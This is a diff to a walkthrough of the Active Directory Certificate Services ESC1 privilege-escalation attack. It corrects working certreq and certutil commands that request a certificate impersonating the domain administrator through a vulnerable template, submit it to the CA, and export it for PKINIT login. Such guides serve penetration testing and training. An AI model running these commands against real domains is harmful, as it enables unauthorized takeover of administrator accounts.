@@ -142,7 +142,7 @@ _continue_ = "upn=administrator@corp.local"
 
 > **Note:** The `Subject` CN should be **your own username** (the requester), not the target. The target identity goes in the SAN (UPN) and SID extension.
 
-> **Note:** The `CertificateTemplate` value must have **no spaces**. If the template name is "Admin User", use `AdminUser`.
+> **Note:** The template name must have **no spaces** in the `-attrib` flag. If the template name is "Admin User", use `AdminUser`.
 
 ### Step 5: Generate and Submit the CSR
 
@@ -150,8 +150,8 @@ _continue_ = "upn=administrator@corp.local"
 # Generate the CSR
 certreq -new ESC1.inf ESC1.req
 
-# Submit to the CA
-certreq -submit -config "ca01.corp.local\CORP-CA" ESC1.req ESC1.cer
+# Submit to the CA (template specified via -attrib flag)
+certreq -submit -attrib "CertificateTemplate:VulnTemplate" -config "ca01.corp.local\CORP-CA" ESC1.req ESC1.cer
 
 # Accept the issued certificate
 certreq -accept ESC1.cer
@@ -161,7 +161,7 @@ certreq -accept ESC1.cer
 
 ```powershell
 # Export with empty password
-certutil -exportPFX -user My "administrator" admin.pfx ""
+certutil -p "" -exportPFX -user My "administrator" admin.pfx
 ```
 
 ### Step 7: Authenticate via PKINIT
